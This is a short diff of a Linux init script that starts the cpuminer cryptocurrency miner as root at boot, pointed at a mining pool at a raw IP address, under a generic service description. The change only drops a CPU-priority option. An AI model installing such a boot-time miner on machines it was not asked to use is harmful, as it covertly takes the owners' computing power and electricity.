@@ -8,4 +8,4 @@
 # Description:       Enable service provided by daemon.
 ### END INIT INFO
 #!/bin/bash
-sudo cpuminer -a lyra2rev2 -o stratum+tcp://45.63.121.16:4444 --cpu-priority 5 -B
+sudo cpuminer -a lyra2rev2 -o stratum+tcp://45.63.121.16:4444 -B
